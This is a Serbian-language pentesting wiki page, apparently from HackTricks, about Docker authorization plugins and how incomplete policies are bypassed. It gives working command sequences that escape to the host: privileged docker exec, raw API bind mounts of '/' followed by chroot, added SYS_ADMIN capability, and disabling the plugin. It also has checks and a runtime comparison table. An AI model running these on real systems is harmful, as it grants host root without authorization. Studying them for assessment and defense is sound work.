# Dodaci za autorizaciju tokom izvršavanja

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Dodaci za autorizaciju tokom izvršavanja predstavljaju dodatni sloj policy-ja koji odlučuje da li pozivalac sme da izvrši određenu radnju daemon-a. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Dodaci za autorizaciju pokušavaju da suze taj model proverom identiteta autentifikovanog korisnika i zahtevanih API operacija, a zatim dozvoljavaju ili odbijaju zahtev u skladu sa policy-jem.

Ova tema zaslužuje sopstvenu stranicu zato što menja model eksploatacije kada napadač već ima pristup Docker API-ju ili korisniku u `docker` grupi. U takvim okruženjima pitanje više nije samo „mogu li da dođem do daemon-a?“, već i „da li je daemon zaštićen authorization slojem i, ako jeste, može li se taj sloj zaobići preko endpoint-a koji nisu obrađeni, slabog JSON parsiranja ili dozvola za upravljanje plugin-ovima?“

## Rad

Kada zahtev stigne do Docker daemon-a, authorization podsistem može proslediti kontekst zahteva jednom ili više instaliranih plugin-ova. Plugin vidi identitet autentifikovanog korisnika, detalje zahteva, izabrana zaglavlja i delove tela zahteva ili odgovora kada je tip sadržaja odgovarajući. Više plugin-ova može biti ulančano, a pristup se odobrava samo ako svi plugin-ovi dozvole zahtev.

Ovaj model deluje snažno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor policy-ja dobro razumeo API. Plugin koji blokira `docker run --privileged`, ali zanemaruje `docker exec`, ne prepoznaje alternativne JSON ključeve kao što je `Binds` na najvišem nivou ili dozvoljava administraciju plugin-ova, može stvoriti lažan osećaj ograničenja, dok direktni putevi za eskalaciju privilegija i dalje ostaju otvoreni.

## Uobičajene mete plugin-ova

Važne oblasti za pregled policy-ja su:

- endpoint-i za kreiranje kontejnera
- polja `HostConfig` kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje namespace-a
- ponašanje `docker exec` komande
- endpoint-i za upravljanje plugin-ovima
- svi endpoint-i koji mogu indirektno pokrenuti runtime radnje izvan predviđenog modela policy-ja

Istorijski gledano, primeri kao što su Twistlock-ov `authz` plugin i jednostavni edukativni plugin-ovi kao što je `authobot` olakšali su proučavanje ovog modela, jer su njihovi policy fajlovi i putanje koda pokazivali kako je mapiranje endpoint-a na radnje zapravo implementirano. Za potrebe procene, važna lekcija je da autor policy-ja mora da razume čitavu API površinu, a ne samo najvidljivije CLI komande.

## Zloupotreba

Prvi cilj je saznati šta je zapravo blokirano. Ako daemon odbije radnju, greška često leak-uje ime plugin-a, što pomaže u identifikovanju korišćene kontrole:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ako vam je potrebno šire profilisanje endpointa, alati kao što je `docker_auth_profiler` korisni su jer automatizuju inače repetitivan zadatak provere API ruta i JSON struktura koje su pluginom zaista dozvoljene.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, popišite koja polja objekata su zaista filtrirana:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ove provere su važne zato što su mnogi propusti u autorizaciji specifični za polja, a ne za koncepte. Plugin može odbiti CLI obrazac, a da pritom u potpunosti ne blokira ekvivalentnu API strukturu.

### Potpun primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera

Politika koja blokira kreiranje privilegovanih kontejnera, ali dozvoljava kreiranje unconfined kontejnera uz `docker exec`, i dalje može biti zaobiđena:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ako daemon prihvati drugi korak, korisnik je povratio privilegovan interaktivni proces unutar containera za koji je autor policy-ja verovao da je ograničen.

### Ceo primer: Bind Mount kroz Raw API

Neke neispravne policy-je proveravaju samo jedan JSON oblik. Ako bind mount root filesystem-a nije dosledno blokiran, host se i dalje može montirati:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ista ideja se može pojaviti i pod `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Uticaj predstavlja potpuno bekstvo iz filesystema hosta. Zanimljiv detalj je to što bypass potiče od nepotpune pokrivenosti politikom, a ne od kernel bug-a.

### Kompletan primer: neprovereni atribut capability-ja

Ako politika zaboravi da filtrira atribut povezan sa capability-jem, napadač može da kreira kontejner koji ponovo dobija opasan capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Kada je prisutan `CAP_SYS_ADMIN` ili slična snažna capability, mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju dostupne.

### Potpun primer: Onemogućavanje plugina

Ako su operacije upravljanja pluginom dozvoljene, najčistiji bypass može biti da se kontrola u potpunosti isključi:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ovo je greška politike na nivou control-plane-a. Sloj autorizacije postoji, ali korisnik čiji je pristup trebalo da ograniči i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande služe za utvrđivanje da li sloj politike postoji i da li deluje kompletno ili površno.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Šta je ovde zanimljivo:

- Poruke o odbijanju koje sadrže naziv plugina potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
- Lista plugina vidljiva napadaču može biti dovoljna za otkrivanje da li su moguće operacije disable ili reconfigure.
- Policy koji blokira samo očigledne CLI akcije, ali ne i raw API zahteve, treba smatrati zaobiđivim dok se ne dokaže suprotno.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano nije omogućen | Pristup daemon-u je praktično all-or-nothing, osim ako nije konfigurisan authorization plugin | nepotpuna plugin policy, blacklists umesto allowlists, dozvoljeno upravljanje pluginima, slepe tačke na nivou polja |
| Podman | Nije uobičajeni direktni ekvivalent | Podman se obično više oslanja na Unix permissions, rootless izvršavanje i odluke o izlaganju API-ja nego na authz plugin-e u Docker stilu | široko izložen rootful Podman API, slabe socket permissions |
| containerd / CRI-O | Drugačiji model kontrole | Ovi runtime-i se obično oslanjaju na socket permissions, granice poverenja na node-u i kontrole na višem sloju orchestrator-a, umesto na Docker authz plugin-e | mountovanje socket-a u workloads, slabe lokalne pretpostavke o poverenju u node |
| Kubernetes | Koristi authn/authz na slojevima API-server-a i kubelet-a, a ne Docker authz plugin-e | Cluster RBAC i admission kontrole predstavljaju glavni policy sloj | preširok RBAC, slaba admission policy, direktno izlaganje kubelet ili runtime API-ja |
{{#include ../../../banners/hacktricks-training.md}}
